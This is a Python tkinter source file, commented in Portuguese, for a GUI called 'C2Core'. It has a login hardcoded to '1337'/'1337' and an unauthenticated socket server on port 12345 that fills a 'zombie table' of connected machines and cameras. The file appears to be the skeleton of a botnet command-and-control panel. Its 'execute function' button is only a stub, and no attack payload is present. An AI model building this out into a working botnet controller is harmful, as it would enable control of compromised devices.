import tkinter as tk
from tkinter import messagebox, Menu, ttk
from PIL import Image, ImageTk
from cliente_check import verificar_clientes
import socket
import threading

# Dicionário para armazenar o status dos clientes
clientes_status = {}

def servidor():
    """Função que inicia o servidor para escutar os clientes."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))  # Escuta em todas as interfaces na porta 12345
    server_socket.listen()

    while True:
        client_socket, addr = server_socket.accept()
        threading.Thread(target=gerenciar_cliente, args=(client_socket,)).start()

def gerenciar_cliente(client_socket):
    """Gerencia a conexão de um cliente."""
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            nome, status = data.split(',')
            clientes_status[nome] = status
        except ConnectionResetError:
            break
    client_socket.close()

def abrir_nova_janela():
    nova_janela = tk.Toplevel()
    nova_janela.title("Bem-vindo ao C2Core")
    nova_janela.geometry("600x400")  

    menu = Menu(nova_janela)
    nova_janela.config(menu=menu)
    filemenu = Menu(menu)
    menu.add_cascade(label='[Menu]', menu=filemenu)
    filemenu.add_command(label='Novo')
    filemenu.add_command(label='Abrir...')
    filemenu.add_separator()
    filemenu.add_command(label='Sair', command=nova_janela.quit)
    helpmenu = Menu(menu)
    menu.add_cascade(label='[Tabela de Zumbis]', menu=helpmenu)
    helpmenu.add_command(label='Sobre')

    # Adiciona uma imagem
    webp_path = "biblioteca/bug.webp"  
    imagem_webp = Image.open(webp_path)
    imagem_tk = ImageTk.PhotoImage(imagem_webp)

    imagem_label = tk.Label(nova_janela, image=imagem_tk)
    imagem_label.image = imagem_tk  
    imagem_label.pack(pady=20)

    mensagem = tk.Label(nova_janela, text="Login realizado com sucesso!", font=("Arial", 14))
    mensagem.pack(pady=10)

    # Cria a tabela de zumbis e armazena a referência na nova janela
    nova_janela.tabela = criar_tabela_zumbis(nova_janela)

    funcao_button = tk.Button(nova_janela, text="Executar Função", command=executar_funcao)
    funcao_button.pack(pady=10)

    fechar_button = tk.Button(nova_janela, text="Fechar", command=nova_janela.destroy)
    fechar_button.pack(pady=10)

    # Inicia a atualização da tabela
    atualizar_tabela(nova_janela)

def criar_tabela_zumbis(parent):
    frame = tk.Frame(parent)
    frame.pack(pady=10)

    tabela = ttk.Treeview(frame, columns=('Nome', 'Tipo', 'Status'), show='headings')
    tabela.heading('Nome', text='Nome')
    tabela.heading('Tipo', text='Tipo')
    tabela.heading('Status', text='Status')

    tabela.pack()
    
    # Atualiza a tabela com dados
    atualizar_dados_tabela(tabela)

    return tabela  # Retorna a tabela criada

def atualizar_dados_tabela(tabela):
    # Limpa a tabela antes de atualizar
    for item in tabela.get_children():
        tabela.delete(item)

    # Adiciona os clientes à tabela
    for nome, status in clientes_status.items():
        tipo = 'Máquina' if 'Máquina' in nome else 'Câmera'
        tabela.insert('', tk.END, values=(nome, tipo, status))

def atualizar_tabela(parent):
    tabela = parent.tabela
    atualizar_dados_tabela(tabela)
    parent.after(5000, atualizar_tabela, parent)  # Atualiza a tabela a cada 5 segundos

def executar_funcao():
    messagebox.showinfo("Função", "Função executada com sucesso!")

def validar_login():
    usuario = username_entry.get()
    senha = password_entry.get()

    if usuario == "1337" and senha == "1337":
        parent.withdraw()  # Esconde a janela de login
        abrir_nova_janela()  # Abre nova janela
    else:
        messagebox.showerror("Erro", "Usuário ou senha inválidos")

# Configuração da janela principal
parent = tk.Tk()
parent.title("C2Core Login")
parent.geometry("300x150")  # Define tamanho da janela de login

username_label = tk.Label(parent, text="Usuário:")
username_label.pack()

username_entry = tk.Entry(parent)
username_entry.pack()

password_label = tk.Label(parent, text="Senha:")
password_label.pack()

password_entry = tk.Entry(parent, show="*")
password_entry.pack()

login_button = tk.Button(parent, text="Entrar", command=validar_login)
login_button.pack(pady=10)

# Iniciar o servidor em uma thread
threading.Thread(target=servidor, daemon=True).start()

# Iniciar o loop da aplicação
parent.mainloop()